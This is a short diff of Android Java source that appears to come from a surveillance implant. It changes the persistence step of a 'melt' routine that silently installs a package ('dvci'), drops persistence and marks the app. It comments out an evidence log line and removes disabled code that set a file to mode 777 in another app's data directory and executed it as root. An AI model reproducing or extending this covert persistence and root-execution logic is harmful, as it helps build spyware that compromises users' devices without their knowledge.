@@ -1149,19 +1149,13 @@ public class Core extends Activity implements Runnable {
 			file.delete();
 
 			if (PackageUtils.isInstalledApk(dvci)) {
-				EvidenceBuilder.info("Persistence installed");
+				//EvidenceBuilder.info("Persistence installed");
 				if (Cfg.DEMO) {
 					Status.self().makeToast(M.e("Melt: dropped persistence"));
 				}
 
 				Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
 				markupMelt.serialize(Status.getAppContext().getPackageName());
-
-//				AutoFile markup = new AutoFile(String.format("/data/data/%s/mm", pack));
-//				markup.chmod("777");
-//
-//				markup.write(pack.getBytes());
-//				Execute.executeRoot(String.format("/data/data/%s/mm /data/data/%s/mm", pack, dvci ));
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installSilentAsset), stopping melt");
